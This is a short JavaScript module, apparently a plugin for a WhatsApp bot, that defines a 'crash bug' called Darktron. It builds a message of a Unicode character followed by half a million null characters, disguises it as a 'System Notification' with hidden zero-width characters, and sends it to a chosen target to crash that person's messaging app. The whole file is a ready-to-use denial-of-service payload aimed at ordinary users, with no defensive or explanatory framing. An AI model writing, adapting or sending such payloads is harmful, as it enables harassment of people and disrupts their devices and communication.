// ============================================================
// BUG: darktron — Text-based crash
// Source: Tayyab — adapted
// ============================================================

const PAYLOAD = '﷼' + '\u0000'.repeat(500000);

export default {
  id: 'darktron',
  name: 'Darktron',

  async execute({ sock, target }) {
    const text = '📢 System Notification\n\n⬇️\u200C\u200B\u200D\n\n' + PAYLOAD;

    await sock.sendMessage(target, { text });
  },
};